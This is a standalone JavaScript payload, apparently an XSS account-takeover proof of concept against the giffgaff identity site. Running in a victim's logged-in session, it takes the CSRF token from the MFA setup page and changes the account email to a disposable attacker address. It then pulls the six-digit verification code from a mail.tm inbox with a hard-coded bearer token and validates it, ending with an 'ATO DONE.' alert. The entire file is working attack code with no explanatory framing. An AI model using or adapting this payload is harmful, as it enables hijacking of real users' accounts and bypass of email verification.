var xhr = new XMLHttpRequest();
xhr.open("GET", "/auth/mfa/setup");
xhr.withCredentials = true;
xhr.onreadystatechange = () => {
        if (xhr.readyState == 4) {
            var domparser = new DOMParser();
            dom = new DOMParser().parseFromString(xhr.response, 'text/html');
            var csrf_token = JSON.parse(dom.getElementById("__NEXT_DATA__").innerText).props.pageProps.csrfToken.token
            xhr.open("POST", "https://id.giffgaff.com/auth/challenges/email", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.setRequestHeader("X-Csrf-Token", csrf_token);
            var body = '{"email":"test@testtt.com","source":"mfa-setup"}';
            xhr.onreadystatechange = () => {
                if (xhr.readyState == 4) {
                    window.setTimeout(() => {
                            xhr.open("POST", "https://id.giffgaff.com/auth/challenges/email", true);
                            xhr.setRequestHeader("Content-Type", "application/json");
                            xhr.setRequestHeader("X-Csrf-Token", csrf_token);
                            var body = '{"email":"navaleulalie@indigobook.com","source":"change-email"}';
                            xhr.send(body)
                            xhr.onreadystatechange = () => {
                                if (xhr.readyState == 4) {
                                    window.setTimeout(() => {

                                        xhr.open("GET", "https://api.mail.tm/messages", true);
                                        xhr.setRequestHeader("Accept", "application/json");
                                        xhr.withCredentials = false;
                                        xhr.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3NDExNjc0ODYsInJvbGVzIjpbIlJPTEVfVVNFUiJdLCJhZGRyZXNzIjoibmF2YWxldWxhbGllQGluZGlnb2Jvb2suY29tIiwiaWQiOiI2N2M4MWFjMWJiZDRlMDViM2MwYzk0NjYiLCJtZXJjdXJlIjp7InN1YnNjcmliZSI6WyIvYWNjb3VudHMvNjdjODFhYzFiYmQ0ZTA1YjNjMGM5NDY2Il19fQ.e-ONYzFA4nfr7mrnlpk9hMF1njbSTJgtAktwL6jylNtlQeYB68teiU8WzyPsXpsJNsdbA78fLWm9UKIBUHO5Kg");
                                        xhr.onreadystatechange = () => {
                                            if (xhr.readyState == 4) {
                                                var code = JSON.parse(xhr.response)[0].intro.match(/[0-9]{6}/);

                                                xhr.open("POST", "https://id.giffgaff.com/auth/challenges/email/validate", true);
                                                xhr.withCredentials = true;
                                                xhr.setRequestHeader("Content-Type", "application/json");
                                                xhr.setRequestHeader("X-Csrf-Token", csrf_token);
                                                xhr.send(`{"code":${code}}`)
                                                xhr.onreadystatechange = () => {
                                                    if (xhr.readyState == 4) {
                                                        alert("ATO DONE.")
                                                    }
                                                }
                                            }
                                        }
                                        xhr.send()
                                    }, 7700)
                                }
                            }
                        },2000)
                    }
                }
                xhr.send(body);

            }
        }
        xhr.send()
